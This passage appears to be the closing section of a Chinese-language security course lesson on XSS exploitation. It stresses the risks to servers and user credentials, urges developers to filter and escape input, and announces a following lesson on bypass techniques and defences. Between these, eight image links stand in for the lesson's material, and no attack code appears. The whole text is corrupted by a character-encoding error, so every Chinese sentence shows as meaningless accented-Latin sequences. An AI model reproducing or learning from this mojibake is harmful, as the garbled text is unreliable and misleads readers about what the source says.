XSSçš„å±å®³è¿œä¸æ­¢å¼¹çª—ï¼Œå®ƒæ˜¯ä¸€æ¡é€šå¾€æœåŠ¡å™¨æƒé™ã€ç”¨æˆ·å‡­è¯ç”šè‡³å†…ç½‘æ¸—é€çš„æ½œåœ¨æ·å¾„ã€‚ç†è§£å¹¶å®è·µè¿™äº›åˆ©ç”¨æ–¹æ³•ï¼Œèƒ½å¸®åŠ©æˆ‘ä»¬åœ¨æ¸—é€æµ‹è¯•ä¸­æ›´å…¨é¢åœ°è¯„ä¼°é£é™©ï¼ŒåŒæ—¶ä¹Ÿæé†’æˆ‘ä»¬ä½œä¸ºå¼€å‘è€…ï¼Œå¿…é¡»å¯¹ç”¨æˆ·è¾“å…¥è¿›è¡Œä¸¥æ ¼çš„è¿‡æ»¤å’Œè½¬ä¹‰ã€‚

![](img/8da8e0e1f87a1abc1033c7807feddf84_388.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_390.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_392.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_394.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_396.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_398.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_400.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_402.png)

ä¸‹èŠ‚è¯¾ï¼Œæˆ‘ä»¬å°†æ¢è®¨XSSçš„ç»•è¿‡æŠ€å·§ä¸é˜²å¾¡æ–¹æ¡ˆã€‚